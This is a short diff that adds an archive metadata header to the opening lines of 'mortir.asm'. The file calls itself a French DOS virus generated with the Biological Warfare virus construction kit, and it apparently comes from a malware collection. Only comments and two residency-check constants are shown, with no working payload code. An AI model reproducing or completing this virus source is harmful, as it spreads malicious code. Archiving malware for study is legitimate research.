@@ -1,5 +1,16 @@
+; ------------------------------------------------------------
+; name      M
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ; mortir.asm : Mortir - le virus de francais
-; Created with Biological Warfare - Version 0.90� by MnemoniX
+; Created with Biological Warfare - Version 0.90� by MnemoniX
 
 PING            equ     0D8FAh
 PONG            equ     0F2BEh
